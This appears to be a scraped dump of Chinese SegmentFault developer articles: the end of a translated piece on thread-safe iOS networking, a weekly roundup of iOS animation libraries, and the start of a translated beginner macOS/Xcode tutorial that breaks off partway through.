<pre><code class=""Swift"">extension URLResult {
    var string: String? {
        guard case let .response(data, _) = self,
        let string = String(data: data, encoding: .utf8)
        else { return nil }
        return string
    }
}

URLSession.shared.get(zen, zen) { left, right in
    guard case let (quote1?, quote2?) = (left.string, right.string)
    else { return }

    print(quote1, quote2, separator: ""\n"")
    // Approachable is better than simple.
    // Practicality beats purity.
}</code></pre>
<h2>并行悖论</h2>
<p>我发现解决并行问题最简单最优雅的方法就是尽可能的少使用并发编程，而且我们的处理器非常适合执行那些线性代码。但是如果将大的代码块或任务拆分为多个并行执行的小代码块和任务将会让代码变得更加易读和易维护。</p>
<blockquote><p>作者：Adam Sharp，时间：2017/9/21<br>翻译：BigNerdCoding， 如有错误欢迎指出。<a href=""https://bignerdcoding.com/archives/55.html"" rel=""nofollow noreferrer"">译文地址</a>，<a href=""https://robots.thoughtbot.com/a-simple-approach-to-thread-safe-networking-in-ios-apps?utm_campaign=iOS%252BDev%252BWeekly&amp;utm_medium=rss&amp;utm_source=iOS_Dev_Weekly_Issue_321"" rel=""nofollow noreferrer"">原文链接</a></p></blockquote>

                ", iOS 多网络请求的线程安全,1531971914,551,1,747,1,1,https://segmentfault.com/a/1190000011591022
40,1,0,6,"
                    
<blockquote><p>温馨提示：本文包含大量 GIF 插图，建议在 WiFi 环境下浏览。:)</p></blockquote>
<p><span class=""img-wrap""><img data-src=""/img/bVVziv?w=900&amp;h=385"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p>iPhone X 已经发布，最显著的特质大概就是它的刘海发型了。而随之而来的，还有各种交互。比如下面这个滚动列表：</p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzki?w=304&amp;h=492"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>图片来源：<a href=""http://igeekbar.com/igeekbar/post/429.htm"" rel=""nofollow noreferrer"">http://igeekbar.com/igeekbar/...</a></p>
<p>很酷有木有，然而各位程序员们，你们想好怎么实现了吗？PS：我司前端已哭晕在厕所。</p>
<p>本期技术周刊，一起来看看 iOS 各种酷炫的动画吧~</p>
<h2>一大波动画</h2>
<p><a href=""https://segmentfault.com/p/1210000009174103/read"" rel=""nofollow noreferrer"">简单且强大的弹窗动画库</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVznA?w=412&amp;h=736"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://segmentfault.com/p/1210000009806928/read"" rel=""nofollow noreferrer"">【iOS 效果实现大全】含状态栏、导航栏按钮、标题、偏移等</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVPjqm?w=296&amp;h=549"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://segmentfault.com/a/1190000010234069"" rel=""nofollow noreferrer"">自定义特殊导航栏</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzpp?w=800&amp;h=372"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p><a href=""https://segmentfault.com/a/1190000009998179"" rel=""nofollow noreferrer"">iOS-UICollectionView快速构造/拖拽重排/轮播实现介绍</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzpJ?w=281&amp;h=522"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://segmentfault.com/a/1190000010855245"" rel=""nofollow noreferrer"">swift版本照片选择器</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzpU?w=250&amp;h=445"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span><br><span class=""img-wrap""><img data-src=""/img/bVVzpY?w=250&amp;h=445"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p><a href=""https://segmentfault.com/p/1210000010813427/read"" rel=""nofollow noreferrer"">高仿 ios 相册地图功能</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzqM?w=320&amp;h=569"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p><a href=""https://segmentfault.com/p/1210000010936168/read"" rel=""nofollow noreferrer"">iOS 核心动画的应用及内存泄漏</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzq2?w=300&amp;h=480"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://segmentfault.com/p/1210000009313543/read"" rel=""nofollow noreferrer"">一劳永逸，iOS多选弹窗封装流程</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzrk?w=450&amp;h=800"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p><a href=""https://segmentfault.com/p/1210000011224560/read"" rel=""nofollow noreferrer"">NotchKit - 可能会火的 iPhone X 刘海专用库</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzrB?w=1070&amp;h=1886"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p><a href=""https://segmentfault.com/a/1190000011148470"" rel=""nofollow noreferrer"">喜欢←划，不喜欢→划</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzrL?w=431&amp;h=671"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""1460000011148477"" title=""1460000011148477""></span></p>
<p><a href=""https://segmentfault.com/a/1190000008096625"" rel=""nofollow noreferrer"">iOS链式动画、Spring动画，TimingFunction扩展</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVH8tH?w=1100&amp;h=612"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://segmentfault.com/p/1210000009668619/read"" rel=""nofollow noreferrer"">一个24小时天气折线图(仿墨迹天气)</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzte?w=374&amp;h=658"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://segmentfault.com/p/1210000009773987/read"" rel=""nofollow noreferrer"">iOS 10 来点不一样的推送（一）</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzto?w=450&amp;h=800"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p><a href=""https://segmentfault.com/p/1210000007060071/read"" rel=""nofollow noreferrer"">iOS开发 iOS10推送必看(高阶2)</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVztF?w=528&amp;h=938"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p><a href=""https://segmentfault.com/p/1210000008977525/read"" rel=""nofollow noreferrer"">iOS_Development~跑马灯/滚动文字条</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzt1?w=369&amp;h=643"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://github.com/cruisediary/Pastel"" rel=""nofollow noreferrer"">Pastel：类似 Instagram 界面的渐变动画效果渲染</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzuO?w=270&amp;h=480"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p><a href=""https://segmentfault.com/a/1190000010353114"" rel=""nofollow noreferrer"">在通知栏上玩游戏，Steve iOS 游戏实现思路</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzuu?w=450&amp;h=800"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p><a href=""https://segmentfault.com/a/1190000008925879"" rel=""nofollow noreferrer"">UIView 动画进阶</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzu4?w=320&amp;h=320"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://segmentfault.com/a/1190000008925869"" rel=""nofollow noreferrer"">UIView 动画基础</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzvh?w=539&amp;h=539"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://segmentfault.com/p/1210000009174091/read"" rel=""nofollow noreferrer"">TweenKit：功能强大、效果丰富的动画库</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzvK?w=308&amp;h=112"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://segmentfault.com/a/1190000008986560"" rel=""nofollow noreferrer"">AAChartKit 一款极其精美的iOS开源图表库</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzv8?w=372&amp;h=685"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p><a href=""https://segmentfault.com/a/1190000011148361"" rel=""nofollow noreferrer"">仿写淘宝个人中心上面的波纹效果</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzwy?w=308&amp;h=569"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://segmentfault.com/a/1190000006729440"" rel=""nofollow noreferrer"">iOS百度外卖的头像波浪效果实现</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzwN?w=640&amp;h=480"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://segmentfault.com/a/1190000003870360"" rel=""nofollow noreferrer"">iOS小技巧之模糊特效</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzwS?w=321&amp;h=590"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p><a href=""https://segmentfault.com/a/1190000011148306"" rel=""nofollow noreferrer"">格瓦拉的动画效果</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzxd?w=308&amp;h=571"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://github.com/zhongfenglee/IDCardRecognition"" rel=""nofollow noreferrer"">中国大陆第二代身份证识别 iOS 库</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzxk?w=200&amp;h=355"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p><a href=""https://segmentfault.com/p/1210000011076617/read"" rel=""nofollow noreferrer"">一行代码让你的TableView动起来-iOS动画</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzxy?w=237&amp;h=425"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://github.com/gyjzh/LLWeChat"" rel=""nofollow noreferrer"">LLWeChat 1.0</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzsz?w=304&amp;h=540"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://github.com/miliPolo/ARSolarPlay"" rel=""nofollow noreferrer"">通过ARKit实现的太阳系动画</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzyh?w=250&amp;h=444"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://github.com/liangwei518/WaterWave"" rel=""nofollow noreferrer"">iOS上的波浪动画</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzyl?w=252&amp;h=107"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://github.com/Zws-China/CAAnimation"" rel=""nofollow noreferrer"">CAAnimation</a></p>
<p>iOS动画演示，核心动画演示，CAAnimation动画</p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzyo?w=320&amp;h=568"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://github.com/caiyue1993/NeteaseTransitionDemo"" rel=""nofollow noreferrer"">NeteaseTransitionDemo</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzyV?w=748&amp;h=1332"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://github.com/lihongli528628/FeSpinner-master"" rel=""nofollow noreferrer"">Rocket Loader Collection</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzze?w=364&amp;h=652"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://github.com/shibiao/FBScreenAnimation"" rel=""nofollow noreferrer"">FBScreenAnimation</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzzD?w=416&amp;h=760"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://github.com/w1531724247/OCBarrage"" rel=""nofollow noreferrer"">OCBarrage</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzzY?w=545&amp;h=310"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://github.com/mengxianliang/XLBallLoading"" rel=""nofollow noreferrer"">XLBallLoading</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzzL?w=370&amp;h=283"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><a href=""https://github.com/jcapp-gold-finance/ScrollViewAnimation"" rel=""nofollow noreferrer"">ScrollViewAnimation</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVVzz9?w=280&amp;h=521"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<h2>相关推荐</h2>
<p><a href=""https://segmentfault.com/p/1210000008192851/read"" rel=""nofollow noreferrer"">33 个 2017 年必须了解的 iOS 开源库</a></p>
<p><a href=""https://segmentfault.com/p/1210000008092439/read"" rel=""nofollow noreferrer"">27个 iOS 开源库，让你的开发坐上火箭吧</a></p>
<p><a href=""https://segmentfault.com/p/1210000007055207/read"" rel=""nofollow noreferrer"">[译]百里挑一：21 个优质 Swift 开源 App</a></p>
<p>本期完<br>:）</p>
<hr>
<p><span class=""img-wrap""><img data-src=""/img/bVQQAg?w=800&amp;h=372"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>

                ", SegmentFault 技术周刊 Vol.34 - 酷炫的 iOS,1531971915,362,1,349,1,1,https://segmentfault.com/a/1190000011299186
41,1,0,6,"
                    
<blockquote>
<p>本文翻译自 <a href=""https://www.raywenderlich.com/151741/macos-development-beginners-part-1"" rel=""nofollow noreferrer"">raywenderlich.com 的 macOS 开发经典入门教程</a>，已咨询对方网站，可至多翻译 10 篇文章。<br>翻译它只是因为宿舍太吵太热，只有这样才能一句一句看完，并作为自己的笔记，希望各位有英语阅读能力的话，还是去阅读英文原吧，毕竟无论是 Xcode，抑或是官方的文档，还是各种最前沿的资讯都只有英文版本。</p>
<p><strong>相关链接</strong><br>零基础 macOS 应用开发（一）：<a href=""https://www.raywenderlich.com/151741/macos-development-beginners-part-1"" rel=""nofollow noreferrer"">原文</a> / 译文(本文)<br>零基础 macOS 应用开发（二）：<a href=""https://www.raywenderlich.com/151741/macos-development-beginners-part-2"" rel=""nofollow noreferrer"">原文</a> / <a href=""https://segmentfault.com/a/1190000011319297"" rel=""nofollow noreferrer"">译文</a><br>零基础 macOS 应用开发（三）：<a href=""https://www.raywenderlich.com/151741/macos-development-beginners-part-3"" rel=""nofollow noreferrer"">原文</a> / <a href=""https://segmentfault.com/a/1190000011329094"" rel=""nofollow noreferrer"">译文</a></p>
</blockquote>
<p>你想要学习开发你自己的 macOS app 吗？<br>有一个好消息要告诉你！在这个教程中你将会发现，Apple 让开发 macOS app 这件事变得无比简单。你将会学习到如何去创建你的第一个 macOS app——即使你是一个完全的小白。</p>
<ul>
<li>在第一部分中，你将学会如何获取 macOS 开发所需要的工具们。然后，通过创建一个简单的「Hello, World!」app，你将会粗略地认识 Xcode——如何运行一个 app、编辑代码、设计 UI 以及调试你的代码。</li>
<li>在第二、三部分中，你将会创建一个复杂的多的「Egg Timer」app，并了解一个 macOS app 的各个组成部分——从一个 app 是如何启动的，到 UI 是如何被构建的，一直到处理交互。</li>
</ul>
<p>所以你还在等什么呢？桌面级 app 的世界正在等着你！</p>
<blockquote>
<p><strong><em>注意：</em></strong>关于如何开始学习这个系列，这里有一些提示：</p>
<ul>
<li>如果你从未学习过 Swift，这个系列涉及了一些 Swift 知识，所以请先看看我们的 <a href=""https://www.raywenderlich.com/category/swift"" rel=""nofollow noreferrer"">Swift 教程</a>。</li>
<li>如果你已经有过 iOS 的开发经验，第一部分的内容则可以看作一个复习。保险起见，请快速地浏览一下这些内容，然后直接跳转到下一个部分。</li>
<li>这个课程是为完全的小白而准备的——你不需要拥有任何 iOS 或 macOS 开发经验！</li>
</ul>
</blockquote>
<h2>开始</h2>
<p>要成为一个 macOS 开发者，你需要两个东西：</p>
<ol>
<li>一台运行着 macOS Sierra 的 Mac：macOS 操作系统只能在苹果电脑上运行，因此无论是开发还是运行 macOS app，你都需要一台 Mac。</li>
<li>Xcode：这是创建 macOS app 的 IDE（集成开发环境）。稍后你将学会如何在 Mac 上安装它。</li>
</ol>
<p>当你完成 app 的开发，希望将它上传至 App Store 进行销售时，你需要一个 Apple 的开发者账户。但直到你已经准备好让你的 app 飞向整片世界的蓝天，这都不是一个硬性要求。甚至你已经决定发布你的 app，也只有在你准备通过 Mac App Store 进行销售时才会需要一个开发者账户。如果你已经是一个 iOS 开发者，那你已经搞定了一切——Apple 已经将各种开发者账户融合为一个，因此你只需要一个账户就可以为各种 Apple 设备分发 app。</p>
<p>不同于有些其他平台，为 macOS 开发 app 只需要一个工具：Xcode。Xcode 这个 IDE 包含了创建 macOS、iOS、watchOS 和 tvOS app 时所需要的一切。<br>如果你还没有安装好 Xcode，点击你 Mac 左上角的 Apple 图标，并选择 <strong><em>App Store</em></strong> 来打开 App Store。即便 Xcode 是免费的，你仍需要一个 App Store 的账户来下载 Xcode。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137757"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>现在请搜索 Xcode，然后点击<strong><em>获取</em></strong>按钮来开始下载。当它下载并安装好（这可能得花点时间，它不是个小软件）之后，你可以在 <strong><em>应用程序</em></strong>文件夹中打开它。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137758"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>Hello World!</h2>
<p>遵循长久以来学习一门新编程语言或平台的传统，你将会学习如何为 macOS 开发一个「Hello World!」app。</p>
<p>如果 Xcode 现在还没打开，请打开它。你会看到一个「Welcome to Xcode」的窗口。如果你没有看到这个窗口。点击 <strong><em>Window</em></strong> 菜单中的 <strong><em>Welcome to Xcode</em></strong>。</p>
<p>点击 <strong><em>Create a new Xcode project</em></strong> 并在接下来的对话框中，在顶部的标签中选择 <strong><em>macOS</em></strong>，然后在 <strong><em>Application</em></strong> 部分中选择 <strong><em>Cocoa Application</em></strong>，并点击 <strong><em>Next</em></strong>。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137759"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>给你的 app你取个名字——<strong><em>Hello World</em></strong>，并确保 <strong><em>Language</em></strong> 设置为 <strong><em>Swift</em></strong>，以及 <strong><em>Use Storyboards</em></strong> 被勾选。其他选项全部取消勾选。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137760"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>点击 <strong><em>Next</em></strong> 和 <strong><em>Create</em></strong> 来保存你的新项目。</p>
<h2>运行你的 app</h2>
<p>Xcode 已经为你的 app 应用了一个基础的模版，并添加了其运行所需要的所有文件。因此，什么都不用做而直接运行它其实还挺有趣的。<br>点击工具栏上的 <strong><em>播放按钮▶️</em></strong> 或使用键盘快捷键 <strong><em>⌘R</em></strong> 来运行你的 app。Xcode 现在会将所有的代码编译成机器语言，将 app 运行所需要的所有资源文件打包，然后运行它。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137761"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<blockquote><p><strong><em>注意：</em></strong>当你第一次在 Xcode 中运行一个 app 的时候，你可能会被询问是否要 <strong><em>Enable Developer Mode on this Mac（在这台 Mac 上启用开发者模式）</em></strong>，请放心地点击 <strong><em>Enable</em></strong>，这可能会要求你输入 Mac 的开机密码。开发者模式允许 Xcode 附加调试器到你的 app 的进程——这对于开发一个 app 来说极其有用！</p></blockquote>
<p>你现在应该能看到一个空白的窗口了，但请不要灰心——你现在已经能做到这些了：</p>
<ul>
<li>这个窗口可以调整大小、最小化和全屏；</li>
<li>这个 app 拥有已经拥有了一套完整的菜单选项，这其中有很多都已经可以正常使用而不用你做任何事情。</li>
<li>Dock 栏上的 app 图标也拥有了常见的菜单。</li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011137762"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>但是现在是时候来把这个空空的屏幕变得更有趣了，所以请退出这个 app 并返回到 Xcode。</p>
<h2>Xcode 的界面</h2>
<p>Xcode 将许多功能融合在同一个窗口中，因此许多东西并不能同时显示出来。要想成为一个 Xcode 高手，你需要知道你需要的功能在哪里，以及如何打开它们。<br>当你在 Xcode 里打开一个新的工程，你已经拥有了一个带有工具栏和三个主要面板的窗口。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137763"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>左边的窗口是 <strong><em>Navigator（导航器）</em></strong>，在这个面板的顶部有八个标签将它分成了八个部分。你所最常用到的是第一个——<strong><em>Project（项目）</em></strong>——它列出了项目中所有的文件，你可以点击这些文件来编辑它们。<br>中间的面板是 <strong><em>Editor（编辑器）</em></strong>，这里会显示你在 <strong><em>Project Navigator（项目导航器）</em></strong>里选择的文件。<br>右侧的面板是 <strong><em>Utilities（工具集）</em></strong>面板，这里显示的内容会会随着你在 <strong><em>Editor</em></strong> 里进行的操作而变化。</p>
<h2>添加 UI</h2>
<p>你可以使用 Storyboard 来设计 app 的 UI（用户交互界面）。你的 app 已经有了一个 storyboard，所以在 <strong><em>Project Navigator（工程导航器）</em></strong> 中点击 <strong><em>Main.stroyboard</em></strong> 来将之显示在编辑器中。<br>你的屏幕自动切换了，是不是很神奇！在编辑器中，你现在可以看到文档的线框图，以及可视化的 UI 编辑器。<br>看一看你可视化编辑器中的东西。这儿有三个主要的区域，每一个都有着一个文本占位符：</p>
<ul>
<li>
<strong><em>Application Scene</em></strong>：顶部的菜单栏；</li>
<li>
<strong><em>Window Controller Scene</em></strong>：配置窗口会有怎样的表现；</li>
<li>
<strong><em>View Controller Scene</em></strong>：放置 UI 控件的地方。</li>
</ul>
<p>在 <strong><em>Utilities</em></strong> 面板里，你将会看见上半部分有八个标签页，而下半部分有四个标签页<br>下半部分的区域呈现了你可以插入到你的项目里的东西。现在你需要插入 UI 控件，所以点击第三个图标 <strong><em>Object Library</em></strong>。<br>在底部的过滤器（输入框）中，输入「text」，然后找到并拖动一个 <strong><em>Text Field</em></strong> 到你的 <strong><em>View Controller Scene</em></strong>。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137764"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>现在搜索「button」并拖动一个 <strong><em>Push Button</em></strong> 到 <strong><em>View Controller Scene</em></strong> 中。最后，再添加一个 <strong><em>Label</em></strong>。<br>现在，点击<strong><em>播放按钮▶️</em></strong>或按下 <strong><em>⌘R</em></strong> 来编译并运行你的 app，你就能看到这三个 UI 元素了。试着在输入框中打些字——它现在已经支持所有标准的键盘快捷键了：复制、粘贴、剪切、撤销、重做…但是界面上的按钮还是什么都做不了，文本也只显示了一个「Label」，所以现在我们该把它们连接起来。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137765"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>配置 UI</h2>
<p>返回 <strong><em>Main.storyboard</em></strong> 并点击界面上的 Button，在右侧的 <strong><em>Utilities</em></strong> 面板中，点击第四个标签页 <strong><em>Attributes Inspector</em></strong>。<br>把按钮的标题改为「Say Hello」，此时的按钮可能不够宽，所以请点击菜单栏上的 <strong><em>Editor</em></strong>，然后点击 <strong><em>Size to Fit Content</em></strong>。（如果 Size to Fit Content 选项不可用，先点击空白处取消选中这个按钮，再重新选择它，然后再试一次）。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137766"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>现在点击并选中 Text Field。在这个 app 中，用户将在这里输入他们的名字，当他们点击按钮时，app 会显示「Hello」+他们的名字。为了提示用户，我们在 <strong><em>Attributes Inspector</em></strong> 中为输入框中添加一个占位符。<br>把输入框稍微拖大一些，以便能放下一些较长的名字，然后把按钮拖动到它的右边。当你在 <strong><em>View Controller Scene</em></strong> 中拖动元素时，会出现一些蓝色的虚线来帮助你根据 Apple’s Human Interface Guidelines（Apple 人机交互指南）对齐并放置元素。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137767"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>把 Label 放置在输入框的下方。因为这个 Label 十分重要，我们把它的字体改大一些，选中这个 Label，在 <strong><em>Attributes Inspector</em></strong> 中把 <strong><em>Font</em></strong> 更改为 <strong><em>System Regular 30</em></strong>。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137768"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>不如来些更刺激的吧！把文字的颜色改成红色。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137769"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>你不知道用户的名字会有多长，所以我们需要重新调整输入框的大小，以适应字体的高度，并把宽度调整为和窗口的宽度差不多。<br>编译并运行你的 app 来检查一下你的 UI 设置是否生效了。一旦你觉得 Label 中的文字效果令你满意，把 Label 的 <strong><em>Title</em></strong> 删除，这样一来就清空了 Label 里的文字。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137770"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>连接 UI 与代码</h2>
<p>你的 app 现在无法按照你预期的那样工作，你仍需要添加代码来让你的代码能与 UI 通讯。为了建立这种联系，你需要使用 Xcode 的 <strong><em>Assistant Editor</em></strong>，先在导航器中选中 <strong><em>Main.storyboard</em></strong>，按住 Option⌥ 键的同时点击 <strong><em>ViewController.swift</em></strong>，这个操作将会在不关闭之前打开的文件的情况下，为 ViewController.swift 打开第二个编辑器面板。<br>先在屏幕上的东西可能看起来有些拥挤（当然这也取决于你的显示器尺寸），所以点击工具栏最右上方的按钮来隐藏 Utilities 面板。如果你的显示器空间还是不够，把 Navigator 面板也一并隐藏了。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137771"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>选中输入框，按住 Control⌃ 键的同时把文本框拖动到 <code>class ViewController : NSViewController {</code> 和   <code>override func viewDidLoad() {</code> 之间的那一行，松开鼠标时会弹出一个小窗口，在「name」中输入 <code>nameField</code>，然后点击 <strong><em>Connect</em></strong>。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137772"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
